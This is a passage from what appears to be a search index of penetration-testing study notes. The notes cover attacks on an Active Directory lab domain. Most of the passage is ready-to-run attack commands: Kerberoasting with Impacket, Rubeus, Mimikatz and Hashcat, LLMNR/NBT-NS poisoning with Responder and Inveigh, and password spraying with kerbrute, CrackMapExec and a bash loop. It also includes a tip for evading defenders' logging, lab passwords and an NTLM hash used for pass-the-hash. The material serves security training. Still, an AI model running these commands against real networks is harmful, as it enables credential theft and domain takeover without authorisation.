computers\" /domain List of PCs connected to the domain net group \"Domain Controllers\" /domain List PC accounts of domains controllers net group  /domain User that belongs to the group net groups /domain List of domain groups net localgroup All available groups net localgroup administrators /domain List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) net localgroup Administrators Information about a group (admins) net localgroup administrators [username] /add Add user to administrators net share Check current shares net user  /domain Get information about a user within the domain net user /domain List all users of the domain net user %username% Information about the current user net use x: \\computer\\share Mount the share locally net view Get a list of computers net view /all /domain[:domainname] Shares on the domains net view \\computer /ALL List shares of a computer net view /domain List of PCs of the domain"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#net-commands-trick","title":"Net Commands Trick","text":"<p>If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.</p>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#dsquery","title":"Dsquery","text":""},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#user-search","title":"User Search","text":"<pre><code>PS C:\\htb&gt; dsquery user\n\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#computer-search","title":"Computer Search","text":"<p>PS C:\\htb&gt; dsquery computer</p>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#wildcard-search","title":"Wildcard Search","text":"<p>PS C:\\htb&gt; dsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"</p>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#users-with-specific-attributes-set-passwd_notreqd","title":"Users With Specific Attributes Set (PASSWD_NOTREQD)","text":"<p>PS C:\\htb&gt; dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl</p>"},{"location":"old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/#searching-for-domain-controllers","title":"Searching for Domain Controllers","text":"<p>PS C:\\Users\\forend.INLANEFREIGHT&gt; dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName</p>"},{"location":"old/old_ActiveDirectory/Enumeration/InitialEnumerationoftheDomain/","title":"InitialEnumerationoftheDomain","text":""},{"location":"old/old_ActiveDirectory/Enumeration/InitialEnumerationoftheDomain/#identifying-hosts","title":"Identifying Hosts","text":"<pre><code>$ sudo -E wireshark\n</code></pre> <pre><code>$ sudo tcpdump -i ens224 \n</code></pre> <pre><code>$ sudo responder -I ens224 -A \n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/InitialEnumerationoftheDomain/#find-alive-hosts","title":"Find Alive hosts","text":"<pre><code>$ fping -asgq 172.16.5.0/23\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/InitialEnumerationoftheDomain/#scan-alive-hosts","title":"Scan Alive hosts","text":"<p>focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few.</p> <pre><code>$ sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum\n</code></pre>"},{"location":"old/old_ActiveDirectory/Enumeration/InitialEnumerationoftheDomain/#identifying-users","title":"Identifying Users","text":"<pre><code>$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/","title":"Kerberoasting","text":"<p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.</p> <p>Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account\u2019s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.</p> <p>Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#linux","title":"Linux","text":""},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#kerberoasting-performing-the-attack","title":"Kerberoasting - Performing the Attack","text":"<p>Depending on your position in a network, this attack can be performed in multiple ways:</p> <ul> <li>From a non-domain joined Linux host using valid domain user credentials.</li> <li>From a domain-joined Linux host as root after retrieving the keytab file.</li> <li>From a domain-joined Windows host authenticated as a domain user.</li> <li>From a domain-joined Windows host with a shell in the context of a domain account.</li> <li>As SYSTEM on a domain-joined Windows host.</li> <li>From a non-domain joined Windows host using runas /netonly.</li> </ul> <p>Several tools can be utilized to perform the attack:</p> <ul> <li>Impacket\u2019s GetUserSPNs.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py] from a non-domain joined Linux host.</li> <li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li> <li>From Windows, utilizing tools such as PowerView[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1], Rubeus[https://github.com/GhostPack/Rubeus], and other PowerShell scripts.</li> </ul> <p>Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#kerberoasting-with-getuserspnspy","title":"Kerberoasting with GetUserSPNs.py","text":"<p><code>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</code></p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#listing-spn-accounts-with-getuserspnspy","title":"Listing SPN Accounts with GetUserSPNs.py","text":"<pre><code>$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\n</code></pre> <p>We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#requesting-all-tgs-tickets","title":"Requesting all TGS Tickets","text":"<pre><code>$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request \n</code></pre> <p>We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#requesting-a-single-tgs-ticket","title":"Requesting a Single TGS ticket","text":"<pre><code>$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#saving-the-tgs-ticket-to-an-output-file","title":"Saving the TGS Ticket to an Output File","text":"<pre><code>$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#cracking-the-ticket-offline-with-hashcat","title":"Cracking the Ticket Offline with Hashcat","text":"<pre><code>$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#windows","title":"Windows","text":""},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#kerberoasting-semi-manual-method","title":"Kerberoasting - Semi Manual method","text":""},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#enumerating-spns-with-setspnexe","title":"Enumerating SPNs with setspn.exe","text":"<pre><code>&gt; setspn.exe -Q */*\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#targeting-a-single-user","title":"Targeting a Single User","text":"<pre><code>&gt; Add-Type -AssemblyName System.IdentityModel\n&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#retrieving-all-tickets-using-setspnexe","title":"Retrieving All Tickets Using setspn.exe","text":"<pre><code>PS &gt; setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#extracting-tickets-from-memory-with-mimikatz","title":"Extracting Tickets from Memory with Mimikatz","text":"<pre><code>mimikatz # base64 /out:true\nmimikatz # kerberos::list /export  \n\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#preparing-the-base64-blob-for-cracking","title":"Preparing the Base64 Blob for Cracking","text":"<pre><code>$ echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n \n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#placing-the-output-into-a-file-as-kirbi","title":"Placing the Output into a File as .kirbi","text":"<pre><code>$ cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#extracting-the-kerberos-ticket-using-kirbi2johnpy","title":"Extracting the Kerberos Ticket using kirbi2john.py","text":"<pre><code>$ python2.7 kirbi2john.py sqldev.kirbi\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#modifiying-crack_file-for-hashcat","title":"Modifiying crack_file for Hashcat","text":"<pre><code>$ sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#cracking-the-hash-with-hashcat","title":"Cracking the Hash with Hashcat","text":"<pre><code>$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#automated-tool-based-route","title":"Automated / Tool Based Route","text":""},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#using-powerview-to-extract-tgs-tickets","title":"Using PowerView to Extract TGS Tickets","text":"<pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; Get-DomainUser * -spn | select samaccountname\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#using-powerview-to-target-a-specific-user","title":"Using PowerView to Target a Specific User","text":"<pre><code>PS &gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#exporting-all-tickets-to-a-csv-file","title":"Exporting All Tickets to a CSV File","text":"<pre><code>PS &gt; Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#viewing-the-contents-of-the-csv-file","title":"Viewing the Contents of the .CSV File","text":"<pre><code>PS &gt; cat .\\ilfreight_tgs.csv\n</code></pre> <p>We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#using-rubeus","title":"Using Rubeus","text":"<pre><code>PS &gt; .\\Rubeus.exe\n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#using-the-stats-flag","title":"Using the /stats Flag","text":"<pre><code>PS &gt; .\\Rubeus.exe kerberoast /stats\n</code></pre> <p>If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#using-the-nowrap-flag","title":"Using the /nowrap Flag","text":"<pre><code>PS &gt; .\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\n</code></pre> <p>Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the \"\"/nowrap\" flag prevents any base64 ticket blobs from being column wrapped for any function\"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#a-note-on-encryption-types","title":"A Note on Encryption Types","text":"<p><code>The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.</code></p> <p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.</p> <pre><code>PS &gt; .\\Rubeus.exe kerberoast /user:testspn /nowrap\n</code></pre> <pre><code>PS &gt; Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n</code></pre> <p>Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here[https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797] tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#cracking-the-ticket-with-hashcat-rockyoutxt","title":"Cracking the Ticket with Hashcat &amp; rockyou.txt","text":"<pre><code>$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.</p>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#running-hashcat","title":"Running Hashcat","text":"<pre><code>$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"old/old_ActiveDirectory/Kerberoasting/Kerberoasting/#using-the-tgtdeleg-flag","title":"Using the /tgtdeleg Flag","text":"<p>We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.</p> <p><code>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</code></p>"},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/","title":"LLMNR/NBT-NS Poisoning","text":"<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.</p> <p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.</p>"},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/#linux","title":"Linux","text":""},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/#starting-responder-httpsgithubcomlgandxresponder","title":"Starting Responder [https://github.com/lgandx/Responder]","text":"<pre><code>$ sudo responder -I ens224 \n$ sudo responder -I ens224 -w -d\n</code></pre> <p>/usr/share/responder/logs</p>"},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/#cracking-an-ntlmv2-hash-with-hashcat","title":"Cracking an NTLMv2 Hash With Hashcat","text":"<pre><code>$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/#llmnrnbt-ns-poisoning_1","title":"LLMNR/NBT-NS Poisoning","text":""},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/#windows","title":"Windows","text":""},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/#inveigh-httpsgithubcomkevin-robertsoninveighblobmasterinveighps1","title":"Inveigh [https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1]","text":"<p>If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder</p> <p>Press ESC to enter/exit help</p> <pre><code>PS &gt; Import-Module .\\Inveigh.ps1\nPS &gt; (Get-Command Invoke-Inveigh).Parameters\n\nPS &gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre>"},{"location":"old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/#c-inveigh-inveighzero-httpsgithubcomkevin-robertsoninveightreemaster","title":"C# Inveigh (InveighZero) [https://github.com/Kevin-Robertson/Inveigh/tree/master]","text":"<p>Press ESC to enter/exit help</p> <pre><code>PS &gt; .\\Inveigh.exe\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/","title":"Password Spraying","text":"<p>Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.</p>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#enumerating-the-password-policy-linux","title":"Enumerating the Password Policy Linux","text":"<pre><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#smb-null-sessions","title":"SMB NULL Sessions","text":"<p>SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.</p>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-rpcclient","title":"Using rpcclient","text":"<pre><code>rpcclient -U \"\" -N 172.16.5.5\nrpcclient $&gt; querydominfo\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-enum4linux","title":"Using enum4linux","text":"<pre><code>enum4linux -P 172.16.5.5\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-enum4linux-ng","title":"Using enum4linux-ng","text":"<pre><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight\n\ncat ilfreight.json \n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#ldap-anonymous-bind","title":"LDAP Anonymous Bind","text":"<pre><code>COR33@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#enumerating-the-password-policy-windows","title":"Enumerating the Password Policy Windows","text":""},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#enumerating-null-session","title":"Enumerating Null Session.","text":"<pre><code>net use \\\\DC01\\ipc$ \"\" /u:\"\"\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-netexe","title":"Using net.exe","text":"<pre><code>net accounts\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-powerview","title":"Using PowerView","text":"<pre><code>import-module .\\PowerView.ps1\nGet-DomainPolicy\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#making-a-target-user-list","title":"Making a Target User List","text":"<ul> <li>By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller</li> <li>Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list</li> <li>Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users</li> <li>Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist</li> </ul>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#smb-null-session-to-pull-user-list","title":"SMB NULL Session to Pull User List","text":"<p>If you are on an internal machine but don\u2019t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.</p> <p>It\u2019s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don\u2019t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.</p> <p>Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.</p> <pre><code>$ enum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-rpcclient_1","title":"Using rpcclient","text":"<pre><code>$ rpcclient -U \"\" -N 172.16.5.5\nrpcclient $&gt; enumdomusers \n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-crackmapexec","title":"Using CrackMapExec","text":"<pre><code>$ crackmapexec smb 172.16.5.5 --users\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#gathering-users-with-ldap-anonymous","title":"Gathering Users with LDAP Anonymous","text":""},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-ldapsearch","title":"Using ldapsearch","text":"<pre><code>$ ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-windapsearch","title":"Using windapsearch","text":"<pre><code>$ ./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#enumerating-users-with-kerbrute","title":"Enumerating Users with Kerbrute","text":"<pre><code>$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt &gt; kerb.txt\n\ngrep -o '[a-zA-Z0-9._%+-]\\+@[a-zA-Z0-9.-]\\+\\.[a-zA-Z]\\{2,6\\}' kerb.txt\n</code></pre> <p>If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.</p>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#credentialed-enumeration-to-build-our-user-list","title":"Credentialed Enumeration to Build our User List","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users &gt; crack.txt\n\nawk -F 'INLANEFREIGHT.LOCAL\\\\\\\\' '{print $2}' crack.txt | awk '{print $1}' &gt; new_crack.txt\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#internal-password-spraying","title":"Internal Password Spraying","text":""},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#linux","title":"Linux","text":""},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#internal-password-spraying-from-a-linux-host","title":"Internal Password Spraying from a Linux Host","text":""},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-a-bash-one-liner-for-the-attack","title":"Using a Bash one-liner for the Attack","text":"<pre><code>$for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-kerbrute-for-the-attack","title":"Using Kerbrute for the Attack","text":"<pre><code>$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-crackmapexec-filtering-logon-failures","title":"Using CrackMapExec &amp; Filtering Logon Failures","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#validating-the-credentials-with-crackmapexec","title":"Validating the Credentials with CrackMapExec","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#local-administrator-password-reuse","title":"Local Administrator Password Reuse","text":"<pre><code>$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n</code></pre>"},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#windows","title":"Windows","text":""},{"location":"old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/#using-domainpasswordsprayps1","title":"Using DomainPasswordSpray.ps1","text":"<pre><code>PS &gt; Import-Module .\\DomainPasswordSpray.ps1\nPS &gt; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/","title":"Bleeding Edge 